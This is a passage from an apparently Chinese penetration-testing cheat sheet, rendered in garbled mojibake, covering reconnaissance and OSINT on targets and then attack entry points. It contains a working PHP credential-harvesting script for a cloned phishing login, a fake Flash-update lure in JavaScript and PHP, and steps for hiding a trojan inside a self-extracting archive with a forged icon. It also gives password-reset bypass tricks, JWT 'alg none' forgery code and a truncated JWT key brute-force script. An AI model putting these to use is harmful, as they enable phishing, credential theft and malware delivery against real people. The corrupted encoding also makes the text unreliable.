<p>dig @ns.example.com example=.com AXFR<br>nslookup -type=ns xxx.yyy.cn #æŸ¥è¯¢è§£ææŸåŸŸåçš„DNSæœåŠ¡å™¨<br>nslookup #è¿›å…¥nslookupäº¤äº’æ¨¡å¼<br>server dns.domian.com #æŒ‡å®šdnsæœåŠ¡å™¨<br>ls xxx.yyy.cn #åˆ—å‡ºåŸŸä¿¡æ¯</p>
</blockquote>
<h2 id="åŒæœç«™ç‚¹æƒ…å†µ"><a href="#åŒæœç«™ç‚¹æƒ…å†µ" class="headerlink" title="åŒæœç«™ç‚¹æƒ…å†µ"></a>åŒæœç«™ç‚¹æƒ…å†µ</h2><a target="_blank" rel="noopener" href="https://site.ip138.com/">https://site.ip138.com/</a><br>ç«ç‹æ’ä»¶flagfox,é…ç½®å•å‡»æŒ‡å‘bingæŸ¥ipå¯¹åº”çš„åŸŸå<h2 id="åŒæ ·æ¶æ„æˆ–æºç çš„ç«™"><a href="#åŒæ ·æ¶æ„æˆ–æºç çš„ç«™" class="headerlink" title="åŒæ ·æ¶æ„æˆ–æºç çš„ç«™"></a>åŒæ ·æ¶æ„æˆ–æºç çš„ç«™</h2><h2 id="ç½‘ç«™js"><a href="#ç½‘ç«™js" class="headerlink" title="ç½‘ç«™js"></a>ç½‘ç«™js</h2><a target="_blank" rel="noopener" href="https://github.com/003random/getJS">https://github.com/003random/getJS</a><br><a target="_blank" rel="noopener" href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><br>æˆ–æµè§ˆå™¨F12ä¹Ÿå¯ä»¥çœ‹åˆ°åŠ è½½çš„<br>æ•æ„Ÿä¿¡æ¯ã€å¯èƒ½å­˜åœ¨æ¼æ´çš„å‚æ•°ç­‰ä¿¡æ¯<br>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæ³¨é‡Šçš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚æ²¡æœ‰åˆ æ‰çš„æ¥å£ã€å‰å°æ²¡æœ‰çš„é¡µé¢ã€è¶Šæƒã€æ³¨å…¥ã€jsç­‰<h2 id="ç½‘ç«™ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹js"><a href="#ç½‘ç«™ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹js" class="headerlink" title="ç½‘ç«™ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹js"></a>ç½‘ç«™ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹js</h2><h2 id="äº‘ä¿¡æ¯"><a href="#äº‘ä¿¡æ¯" class="headerlink" title="äº‘ä¿¡æ¯"></a>äº‘ä¿¡æ¯</h2>Aliyunã€AWSã€GCPã€Azureç­‰<br>æŸ¥æ‰¾å¯å…¬å¼€è®¿é—®çš„å®ä¾‹<br><a target="_blank" rel="noopener" href="https://github.com/gwen001/s3-buckets-finder">https://github.com/gwen001/s3-buckets-finder</a><br><a target="_blank" rel="noopener" href="https://github.com/nccgroup/aws-inventory">https://github.com/nccgroup/aws-inventory</a><br><a target="_blank" rel="noopener" href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump</a><h2 id="APPåç¼–è¯‘"><a href="#APPåç¼–è¯‘" class="headerlink" title="APPåç¼–è¯‘"></a>APPåç¼–è¯‘</h2>urlã€jsã€osskeyã€apiç­‰ä¿¡æ¯æŸ¥æ‰¾<br>æœé›†åˆ°æ¥å£è¯¥æ€ä¹ˆåš<br>Fuzzå¸¸è§å‚æ•°<h2 id="Cæ®µ-Bæ®µä¿¡æ¯"><a href="#Cæ®µ-Bæ®µä¿¡æ¯" class="headerlink" title="Cæ®µ/Bæ®µä¿¡æ¯"></a>Cæ®µ/Bæ®µä¿¡æ¯</h2>Bannerã€æ˜¯å¦å­˜åœ¨ç›®æ ‡çš„åå°æˆ–å…¶ä»–å…¥å£/å…¶ä»–ä¸šåŠ¡ç³»ç»Ÿ<h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2>recon-ng,theharvester,maltego,exiftoolç­‰<br><a target="_blank" rel="noopener" href="https://www.spiderfoot.net/">https://www.spiderfoot.net/</a><br><a target="_blank" rel="noopener" href="https://github.com/smicallef/spiderfoot">https://github.com/smicallef/spiderfoot</a><h2 id="ç«¯å£å¯¹å¤–å¼€æ”¾æƒ…å†µ"><a href="#ç«¯å£å¯¹å¤–å¼€æ”¾æƒ…å†µ" class="headerlink" title="ç«¯å£å¯¹å¤–å¼€æ”¾æƒ…å†µ"></a>ç«¯å£å¯¹å¤–å¼€æ”¾æƒ…å†µ</h2>Masscanã€scanportç­‰<br>é’ˆå¯¹å¸¸è§çš„é‚£äº›ç«¯å£çš„åˆ©ç”¨çš„å¸¸è§„æ–¹æ³•<br>å¸¸è§çš„æœªæˆæƒè®¿é—®çš„æœåŠ¡å¦‚redisï¼Œmongodbç­‰<h2 id="ç›®å½•æ‰«æ-çˆ¬è™«-æ…ç”¨"><a href="#ç›®å½•æ‰«æ-çˆ¬è™«-æ…ç”¨" class="headerlink" title="ç›®å½•æ‰«æ/çˆ¬è™«(æ…ç”¨)"></a>ç›®å½•æ‰«æ/çˆ¬è™«(æ…ç”¨)</h2><h2 id="WAFæƒ…å†µè¯†åˆ«"><a href="#WAFæƒ…å†µè¯†åˆ«" class="headerlink" title="WAFæƒ…å†µè¯†åˆ«"></a>WAFæƒ…å†µè¯†åˆ«</h2><a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>åšå¥½ç»•è¿‡ç­–ç•¥çš„è®¡åˆ’<h2 id="éšæ‰‹æµ‹è¯•"><a href="#éšæ‰‹æµ‹è¯•" class="headerlink" title="éšæ‰‹æµ‹è¯•"></a>éšæ‰‹æµ‹è¯•</h2>å•å¼•å·<br>xx.jpg/.php<br>admin/123456<br>ä¸‡èƒ½å¯†ç <br>Heartbleedæ¼æ´<h2 id="æœç´¢å¼•æ“"><a href="#æœç´¢å¼•æ“" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h2>Googleè‡ªå®šä¹‰æœç´¢å¼•æ“æ•´åˆçš„300å¤šä¸ªç¤¾äº¤ç½‘ç«™<br><a target="_blank" rel="noopener" href="https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:iyxger-cwug&amp;q=%22%22">https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:iyxger-cwug&amp;q=%22%22</a><br>Googleè‡ªå®šä¹‰æœç´¢å¼•æ“æ•´åˆçš„æ–‡ä»¶å…±äº«ç½‘ç«™<br><a target="_blank" rel="noopener" href="https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:hn5bcrszfhe&amp;q=%22%22">https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:hn5bcrszfhe&amp;q=%22%22</a><br>é¢†è‹±ç”¨æˆ·æå–<br><a target="_blank" rel="noopener" href="https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme">https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme</a><h2 id="Shodan-fofa-zoomeye"><a href="#Shodan-fofa-zoomeye" class="headerlink" title="Shodan/fofa/zoomeye"></a>Shodan/fofa/zoomeye</h2><h2 id="Google-dorks"><a href="#Google-dorks" class="headerlink" title="Google dorks"></a>Google dorks</h2>Site,filetype,intitle,inurl,intextç­‰<h2 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h2>ç”µè¯ã€é‚®ç®±ï¼Œå§“å<br>ç›®å½•éå†<br>å¤‡ä»½æ–‡ä»¶<br>(<a target="_blank" rel="noopener" href="http://www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip/">www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip</a>)<br>.svn/.git/sql/robots/crossdomin.xml/DS_Storeç­‰<br><a target="_blank" rel="noopener" href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br><a target="_blank" rel="noopener" href="https://github.com/admintony/svnExploit">https://github.com/admintony/svnExploit</a><br>è‹¥æ˜¯è®ºå›ID=1çš„ç”¨æˆ·åä¸€èˆ¬ä¸ºç®¡ç†ã€æˆ–æŸ¥çœ‹å¸–å­ä¿¡æ¯ã€ç”Ÿæˆå­—å…¸<br>ç½‘é¡µä¸Šå®¢æœçš„QQ(å…ˆåˆ¤æ–­æ˜¯ä¼ä¸šçš„è¿˜æ˜¯ä¸ªäººï¼Œç”¨å¤„æœ‰æ—¶ä¸å¤ªå¤§ï¼Œçœ‹æ€ä¹ˆç”¨ï¼Œæä¸ªé±¼å‰ä»€ä¹ˆçš„)<h2 id="ç½‘é¡µç¼“å­˜"><a href="#ç½‘é¡µç¼“å­˜" class="headerlink" title="ç½‘é¡µç¼“å­˜"></a>ç½‘é¡µç¼“å­˜</h2><a target="_blank" rel="noopener" href="http://www.cachedpages.com/">http://www.cachedpages.com/</a><h2 id="å›¾ç‰‡åæŸ¥"><a href="#å›¾ç‰‡åæŸ¥" class="headerlink" title="å›¾ç‰‡åæŸ¥"></a>å›¾ç‰‡åæŸ¥</h2>ç™¾åº¦è¯†å›¾ã€googleimageã€tineye<br>åŸå›¾æŸ¥è¯¢åæ ‡<h2 id="ç¤¾äº¤"><a href="#ç¤¾äº¤" class="headerlink" title="ç¤¾äº¤"></a>ç¤¾äº¤</h2>QQã€weiboã€æ”¯ä»˜å®ã€è„‰è„‰ã€é¢†è‹±ã€å’¸é±¼ã€çŸ­è§†é¢‘ã€äººäººã€è´´å§ã€è®ºå›<br>å¤–ç½‘ä¿¡æ¯<br>æœ‰äº›äººå–œæ¬¢æŠŠè‡ªå·±çš„ç”Ÿæ´»ä¼ åˆ°å¤–ç½‘<br>æ¨ç‰¹ã€insã€fbç­‰<h2 id="æ‰‹æœºå·åŠ å…¥é€šè®¯å½•åŒ¹é…å„ä¸ªAPPç”¨æˆ·ä¿¡æ¯"><a href="#æ‰‹æœºå·åŠ å…¥é€šè®¯å½•åŒ¹é…å„ä¸ªAPPç”¨æˆ·ä¿¡æ¯" class="headerlink" title="æ‰‹æœºå·åŠ å…¥é€šè®¯å½•åŒ¹é…å„ä¸ªAPPç”¨æˆ·ä¿¡æ¯"></a>æ‰‹æœºå·åŠ å…¥é€šè®¯å½•åŒ¹é…å„ä¸ªAPPç”¨æˆ·ä¿¡æ¯</h2><h2 id="æ³¨å†Œè¿‡çš„ç½‘ç«™"><a href="#æ³¨å†Œè¿‡çš„ç½‘ç«™" class="headerlink" title="æ³¨å†Œè¿‡çš„ç½‘ç«™"></a>æ³¨å†Œè¿‡çš„ç½‘ç«™</h2><a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a><br><a target="_blank" rel="noopener" href="https://www.usersearch.org/">https://www.usersearch.org/</a><h2 id="ç›®æ ‡äººå‘˜çš„å…´è¶£"><a href="#ç›®æ ‡äººå‘˜çš„å…´è¶£" class="headerlink" title="ç›®æ ‡äººå‘˜çš„å…´è¶£"></a>ç›®æ ‡äººå‘˜çš„å…´è¶£</h2>  ç›®æ ‡äººå‘˜çš„å…´è¶£ æ³¨å†Œè¿‡çš„å°ä¼—è®ºå›ï¼Œç«™ç‚¹<br>é’ˆå¯¹æ­¤ç±»ç«™ç‚¹çš„æ·±å…¥<br>æ”¶é›†åˆ°çš„ç”¨æˆ·åï¼Œç”µè¯ç­‰ä¿¡æ¯ç”Ÿæˆå­—å…¸<h2 id="é‚®ç®±æœé›†"><a href="#é‚®ç®±æœé›†" class="headerlink" title="é‚®ç®±æœé›†"></a>é‚®ç®±æœé›†</h2><a target="_blank" rel="noopener" href="https://hunter.io/">https://hunter.io/</a><br><a target="_blank" rel="noopener" href="https://github.com/killswitch-GUI/SimplyEmail">https://github.com/killswitch-GUI/SimplyEmail</a><h2 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h2><a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a><h2 id="éªŒè¯é‚®ç®±æ˜¯å¦å­˜åœ¨"><a href="#éªŒè¯é‚®ç®±æ˜¯å¦å­˜åœ¨" class="headerlink" title="éªŒè¯é‚®ç®±æ˜¯å¦å­˜åœ¨"></a>éªŒè¯é‚®ç®±æ˜¯å¦å­˜åœ¨</h2><a target="_blank" rel="noopener" href="https://tools.verifyemailaddress.io/">https://tools.verifyemailaddress.io/</a><h2 id="å†å²æ³„éœ²è¿‡çš„èµ„æ–™ç­‰"><a href="#å†å²æ³„éœ²è¿‡çš„èµ„æ–™ç­‰" class="headerlink" title="å†å²æ³„éœ²è¿‡çš„èµ„æ–™ç­‰"></a>å†å²æ³„éœ²è¿‡çš„èµ„æ–™ç­‰</h2>åº“<br><a target="_blank" rel="noopener" href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a><br><a target="_blank" rel="noopener" href="https://github.com/kernelmachine/haveibeenpwned">https://github.com/kernelmachine/haveibeenpwned</a><h2 id="Github-Giteeç­‰ä»£ç æ‰˜ç®¡å¹³å°"><a href="#Github-Giteeç­‰ä»£ç æ‰˜ç®¡å¹³å°" class="headerlink" title="Github/Giteeç­‰ä»£ç æ‰˜ç®¡å¹³å°"></a>Github/Giteeç­‰ä»£ç æ‰˜ç®¡å¹³å°</h2><a target="_blank" rel="noopener" href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a><br><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br><a target="_blank" rel="noopener" href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br><a target="_blank" rel="noopener" href="https://github.com/az0ne/Github_Nuggests">https://github.com/az0ne/Github_Nuggests</a><br><a target="_blank" rel="noopener" href="https://github.com/mazen160/GithubCloner%E5%85%8B%E9%9A%86%E7%94%A8%E6%88%B7%E7%9A%84github">https://github.com/mazen160/GithubClonerå…‹éš†ç”¨æˆ·çš„github</a><h2 id="è¢«å…¥ä¾µç½‘å€åˆ—è¡¨"><a href="#è¢«å…¥ä¾µç½‘å€åˆ—è¡¨" class="headerlink" title="è¢«å…¥ä¾µç½‘å€åˆ—è¡¨"></a>è¢«å…¥ä¾µç½‘å€åˆ—è¡¨</h2><a target="_blank" rel="noopener" href="http://zone-h.org/archive">http://zone-h.org/archive</a><br>wooyuné•œåƒæŸ¥æ‰¾ç›®æ ‡ä¼ä¸šæ›¾å‡ºç°çš„æ¼æ´<h2 id="GPSæŸ¥è¯¢"><a href="#GPSæŸ¥è¯¢" class="headerlink" title="GPSæŸ¥è¯¢"></a>GPSæŸ¥è¯¢</h2><a target="_blank" rel="noopener" href="https://www.opengps.cn/Default.aspx">https://www.opengps.cn/Default.aspx</a><h2 id="ç½‘ç«™URLæå–"><a href="#ç½‘ç«™URLæå–" class="headerlink" title="ç½‘ç«™URLæå–"></a>ç½‘ç«™URLæå–</h2><a target="_blank" rel="noopener" href="http://www.bulkdachecker.com/url-extractor/">http://www.bulkdachecker.com/url-extractor/</a><h2 id="èœœç½åˆ¤æ–­-å‚è€ƒä¸€ä¸‹å³å¯"><a href="#èœœç½åˆ¤æ–­-å‚è€ƒä¸€ä¸‹å³å¯" class="headerlink" title="èœœç½åˆ¤æ–­(å‚è€ƒä¸€ä¸‹å³å¯)"></a>èœœç½åˆ¤æ–­(å‚è€ƒä¸€ä¸‹å³å¯)</h2><a target="_blank" rel="noopener" href="https://honeyscore.shodan.io/">https://honeyscore.shodan.io/</a><h2 id="é»˜è®¤å¯†ç "><a href="#é»˜è®¤å¯†ç " class="headerlink" title="é»˜è®¤å¯†ç "></a>é»˜è®¤å¯†ç </h2><a target="_blank" rel="noopener" href="https://default-password.info/">https://default-password.info/</a><br><a target="_blank" rel="noopener" href="http://routerpasswords.com/">http://routerpasswords.com</a><h2 id="å¦‚éœ€æ³¨å†Œ"><a href="#å¦‚éœ€æ³¨å†Œ" class="headerlink" title="å¦‚éœ€æ³¨å†Œ"></a>å¦‚éœ€æ³¨å†Œ</h2>Sms<br><a target="_blank" rel="noopener" href="https://www.materialtools.com/">https://www.materialtools.com/</a><br><a target="_blank" rel="noopener" href="http://receivefreesms.com/">http://receivefreesms.com/</a><br>Email<br><a target="_blank" rel="noopener" href="https://10minutemail.net/">https://10minutemail.net/</a><br><a target="_blank" rel="noopener" href="https://zh.mytrashmailer.com/">https://zh.mytrashmailer.com/</a><br><a target="_blank" rel="noopener" href="http://24mail.chacuo.net/enus">http://24mail.chacuo.net/enus</a><br><a target="_blank" rel="noopener" href="https://www.linshiyouxiang.net/">https://www.linshiyouxiang.net/</a><br>Fake id<br><a target="_blank" rel="noopener" href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com/</a><br><a target="_blank" rel="noopener" href="http://www.haoweichi.com/">http://www.haoweichi.com/</a><br><a target="_blank" rel="noopener" href="https://www.fakeaddressgenerator.com/">https://www.fakeaddressgenerator.com/</a><h2 id="ä¼ä¸šä¿¡æ¯"><a href="#ä¼ä¸šä¿¡æ¯" class="headerlink" title="ä¼ä¸šä¿¡æ¯"></a>ä¼ä¸šä¿¡æ¯</h2>å¤©çœ¼æŸ¥ã€ä¼æŸ¥æŸ¥ã€ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿ<br>ä¼ä¸šé‚®ç®±æ”¶é›†ï¼Œä¼ä¸šæ¶æ„ç”»åƒã€äººå‘˜ç»Ÿè®¡ã€äººå‘˜èŒè´£ã€éƒ¨é—¨ã€WiFiã€å¸¸ç”¨éƒ¨é—¨å¯†ç ã€äººå‘˜æ˜¯å¦æ³„éœ²è¿‡å¯†ç ã€äººå‘˜å¹³æ—¶çˆ±é€›çš„ç«™ç‚¹ã€OA/erp/crm/sso/mail/vpnç­‰å…¥å£ã€ç½‘ç»œå®‰å…¨è®¾å¤‡ï¼ˆwaf,ips,ids,routerç­‰ç»Ÿè®¡ï¼‰ã€å†…éƒ¨ä½¿ç”¨çš„ä»£ç æ‰˜ç®¡å¹³å°(gitlabã€daocloudç­‰)ï¼Œbugç®¡ç†å¹³å°ã€æœåŠ¡å™¨åŸŸåèµ„äº§ç»Ÿè®¡<h1 id="å…¥å£ç‚¹"><a href="#å…¥å£ç‚¹" class="headerlink" title="å…¥å£ç‚¹"></a>å…¥å£ç‚¹</h1><h2 id="win10-å®‰è£…kali-wsl"><a href="#win10-å®‰è£…kali-wsl" class="headerlink" title="win10 å®‰è£…kali(wsl)"></a>win10 å®‰è£…kali(wsl)</h2>Microsoft StoreæŸ¥æ‰¾kaliä¸‹è½½ã€‚<br>Powershellæ‰§è¡Œ<blockquote>
<p>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux<br>æºè®¾ç½®vim /etc/apt/source.list<br>deb <a target="_blank" rel="noopener" href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb <a target="_blank" rel="noopener" href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a target="_blank" rel="noopener" href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>sudo su<br>passwd rootä¿®æ”¹rootå¯†ç <br>apt-get update &amp;apt-get upgrade æ›´æ–°<br>apt-get dist-upgrade<br>apt-get clean<br>cmd&gt;kali config â€“default-user root è®¾ç½®é»˜è®¤å¯åŠ¨ç”¨æˆ·ä¸ºroot<br>cmd&gt;net stop/start LxssManageré‡å¯æœåŠ¡<br>apt-get install metasploit-framework<br>apt install kali-linux-full å®‰è£…å®Œæ•´kaliå·¥å…·é›†</p>
</blockquote>
<h2 id="æ°´å‘æ”»å‡»"><a href="#æ°´å‘æ”»å‡»" class="headerlink" title="æ°´å‘æ”»å‡»"></a>æ°´å‘æ”»å‡»</h2><h3 id="XSSå…‹éš†é’“é±¼"><a href="#XSSå…‹éš†é’“é±¼" class="headerlink" title="XSSå…‹éš†é’“é±¼"></a>XSSå…‹éš†é’“é±¼</h3>ä¿å­˜js&amp;cssåˆ°æœåŠ¡å™¨ï¼Œç™»å½•actionæ”¹ä¸ºæ¥å—å¯†ç çš„æ–‡ä»¶action=â€./pass.phpâ€<?php //php
$user=$_POST['username'];
$pass=$_POST['password'];
$file=fopen('pass.txt','a+');
fwrite($file,$user."|"."pass" . "\n");
fclose($file);
echo "<script>window.location.href=\"http://192.168.0.1\"</script>\n";
?>
æ„é€ payload<script>window.location.href="http://192.168.0.1/login.html"</script>
php â€“S 0.0.0.0:8080 â€“t ./<h3 id="ä¼ªé€ é¡µé¢é’“é±¼"><a href="#ä¼ªé€ é¡µé¢é’“é±¼" class="headerlink" title="ä¼ªé€ é¡µé¢é’“é±¼"></a>ä¼ªé€ é¡µé¢é’“é±¼</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a><br>æ·»åŠ xsså¹³å°æ¨¡å—<br>window.alert = function(name){<br>var iframe = document.createElement(â€œIFRAMEâ€);<br>iframe.style.display=â€noneâ€;<br>iframe.setAttribute(â€œsrcâ€,â€™data:text/plainâ€™);<br>document.documentElement.appendChild(iframe);<br>window.frames[0].window.alert(name);<br>iframe.parentNode.removeChild(iframe);<br>}<br>alert(â€œæ‚¨çš„FLASHç‰ˆæœ¬è¿‡ä½ï¼Œå°è¯•å‡çº§åè®¿é—®è¯¥é¡µé¢ï¼â€);<br>window.location.href=â€<a target="_blank" rel="noopener" href="http://www.flash.com&quot;/">http://www.flash.com&quot;</a>;<br>åˆ¶ä½œè‡ªè§£å‹æ†ç»‘<br>ä¸€ä¸ªé©¬.exeï¼Œä¸€ä¸ªæ­£å¸¸exeï¼Œå…¨é€‰ï¼Œwinraræ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶ï¼Œé€‰æ‹©åˆ›å»ºè‡ªè§£å‹æ ¼å¼å‹ç¼©æ–‡ä»¶ï¼Œé«˜çº§-&gt;è‡ªè§£å‹é€‰é¡¹ï¼Œè®¾ç½®è§£å‹è·¯å¾„ï¼Œc:\windows\temp\ï¼Œè®¾ç½®-&gt;è§£å‹åè¿è¡Œä¸¤ä¸ªexeæ–‡ä»¶ï¼Œæ¨¡å¼å…¨éƒ¨éšè—ï¼Œæ›´æ–°ï¼Œè§£å‹å¹¶æ›´æ–°æ–‡ä»¶ï¼Œè¦†ç›–æ‰€æœ‰æ–‡ä»¶ã€‚<br>ResourceHackerä¿®æ”¹æ–‡ä»¶å›¾æ ‡<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4>if(empty($_COOKIE[â€˜flashâ€™])){<pre><code>echo &#39;&lt;script&gt;alert(&quot;ä½ å½“å‰è®¡ç®—æœºçš„Flashè½¯ä»¶å·²ç»å¾ˆä¹…æœªæ›´æ–°ï¼Œå°†å¯¼è‡´æ— æ³•æ­£å¸¸æ˜¾ç¤ºç•Œé¢å†…å®¹ï¼Œè¯·ä¸‹è½½å®‰è£…æœ€æ–°ç‰ˆæœ¬ï¼&quot;);window.location=&quot;http://www.flash.cn.xx.com/&quot;&lt;/script&gt;&#39;;
setcookie(&quot;flash&quot;,&quot;true&quot;,time()+30*2400);
</code></pre>
}<h2 id="å¯¹å¤–æœåŠ¡æ”»å‡»"><a href="#å¯¹å¤–æœåŠ¡æ”»å‡»" class="headerlink" title="å¯¹å¤–æœåŠ¡æ”»å‡»"></a>å¯¹å¤–æœåŠ¡æ”»å‡»</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="å‰ç«¯-é€»è¾‘æ¼æ´"><a href="#å‰ç«¯-é€»è¾‘æ¼æ´" class="headerlink" title="å‰ç«¯/é€»è¾‘æ¼æ´"></a>å‰ç«¯/é€»è¾‘æ¼æ´</h4><h5 id="æ³¨å†Œ"><a href="#æ³¨å†Œ" class="headerlink" title="æ³¨å†Œ"></a>æ³¨å†Œ</h5>ä»»æ„ç”¨æˆ·æ³¨å†Œ<br>å¯çˆ†ç ´ç”¨æˆ·å<br>æ³¨å…¥<br>XSS<h5 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h5>çˆ†ç ´ç”¨æˆ·åï¼Œå¯†ç <br>æ³¨å…¥<br>ä¸‡èƒ½å¯†ç <br>Xss<br>Xss+Csrf<br>ä¿®æ”¹è¿”å›åŒ…ä¿¡æ¯ï¼Œç™»å…¥ä»–äººè´¦æˆ·<br>ä¿®æ”¹cookieä¸­çš„å‚æ•°ï¼Œå¦‚user,adminidç­‰<h5 id="ä»»æ„å¯†ç é‡ç½®"><a href="#ä»»æ„å¯†ç é‡ç½®" class="headerlink" title="ä»»æ„å¯†ç é‡ç½®"></a>ä»»æ„å¯†ç é‡ç½®</h5>1ï¼é‡ç½®ä¸€ä¸ªè´¦æˆ·ï¼Œä¸å‘é€éªŒè¯ç ï¼Œè®¾ç½®éªŒè¯ç ä¸ºç©ºå‘é€è¯·æ±‚ã€‚<br>2ï¼å‘é€éªŒè¯ç ï¼ŒæŸ¥çœ‹ç›¸åº”åŒ…<br>3ï¼éªŒè¯ç ç”Ÿå­˜æœŸçš„çˆ†ç ´<br>4ï¼ä¿®æ”¹ç›¸åº”åŒ…ä¸ºæˆåŠŸçš„ç›¸åº”åŒ…<br>5ï¼æ‰‹å·¥ç›´æ¥è·³è½¬åˆ°æ ¡éªŒæˆåŠŸçš„ç•Œé¢<br>6ï¼ä¸¤ä¸ªè´¦æˆ·ï¼Œé‡ç½®åˆ«äººå¯†ç æ—¶ï¼Œæ›¿æ¢éªŒè¯ç ä¸ºè‡ªå·±æ­£ç¡®çš„éªŒè¯ç <br>7ï¼é‡ç½®åˆ«äººå¯†ç æ—¶ï¼Œæ›¿æ¢ä¸ºè‡ªå·±çš„æ‰‹æœºå·<br>8ï¼é‡ç½®è‡ªå·±çš„æˆåŠŸæ—¶ï¼ŒåŒæ„æµè§ˆå™¨é‡ç½®åˆ«äººçš„ï¼Œä¸å‘éªŒè¯ç <br>9ï¼æ›¿æ¢ç”¨æˆ·åï¼ŒIDï¼Œcookieï¼Œtokenå‚æ•°ç­‰éªŒè¯èº«ä»½çš„å‚æ•°<br>10ï¼é€šè¿‡è¶Šæƒä¿®æ”¹ä»–äººçš„æ‰¾å›ä¿¡æ¯å¦‚æ‰‹æœº/é‚®ç®±æ¥é‡ç½®<h5 id="ä¿¡æ¯æ³„éœ²-1"><a href="#ä¿¡æ¯æ³„éœ²-1" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h5>HTMLæºç ã€JSç­‰æŸ¥çœ‹ä¿¡æ¯æœé›†ä¸€ç« <h5 id="åå°"><a href="#åå°" class="headerlink" title="åå°"></a>åå°</h5>ç™»å½•å‚æ•°ä¿®æ”¹ä¸ºæ³¨å†Œå‚æ•°/regã€/registerã€/signç­‰<h4 id="JWTæ”»å‡»æ‰‹æ³•"><a href="#JWTæ”»å‡»æ‰‹æ³•" class="headerlink" title="JWTæ”»å‡»æ‰‹æ³•"></a>JWTæ”»å‡»æ‰‹æ³•</h4><a target="_blank" rel="noopener" href="https://jwt.io/#debugger-io">https://jwt.io/#debugger-io</a><h5 id="æœªæ ¡éªŒç­¾å"><a href="#æœªæ ¡éªŒç­¾å" class="headerlink" title="æœªæ ¡éªŒç­¾å"></a>æœªæ ¡éªŒç­¾å</h5>å°†åŸJWTä¸²è§£ç åä¿®æ”¹ç”¨æˆ·åç­‰èº«ä»½è®¤è¯çš„åœ°æ–¹ï¼Œç”Ÿæˆæ–°tokenå‘é€è¯·æ±‚<h5 id="ç¦ç”¨å“ˆå¸Œ"><a href="#ç¦ç”¨å“ˆå¸Œ" class="headerlink" title="ç¦ç”¨å“ˆå¸Œ"></a>ç¦ç”¨å“ˆå¸Œ</h5><img src="./img/1.png" alt="image"><br></li>
</ul>
<p>  Algä»£è¡¨åŠ å¯†æ–¹å¼ï¼Œä¿®æ”¹ç”¨æˆ·åç­‰èº«ä»½è®¤è¯çš„åœ°æ–¹ï¼ŒæŠŠHS256è®¾ç½®ä¸ºnoneç”Ÿæˆtokenå‘é€è¯·æ±‚ï¼Œä½¿ç”¨pythonçš„pyjwtæ¨¡å—<br><img src="./img/2.png" alt="image"><br></p>
<p>  jwt.encode({â€˜userâ€™:â€™adminâ€™,â€™arg1â€™:â€™value1â€™,â€™arg2â€™:â€™value2â€™},algorithm=â€™noneâ€™,key=â€™â€™)</p>
<h5 id="æš´ç ´å¼±å¯†é’¥"><a href="#æš´ç ´å¼±å¯†é’¥" class="headerlink" title="æš´ç ´å¼±å¯†é’¥"></a>æš´ç ´å¼±å¯†é’¥</h5><blockquote>
<p>pip3 install pyjwt<br>python3 crack.py<br>  import jwt<br>  import termcolor</p>
</blockquote>
<p>  jwt_str = Râ€™tokenâ€™<br>  with open(â€˜/root/password.txtâ€™) as f:</p>
<pre><code>for line in f:
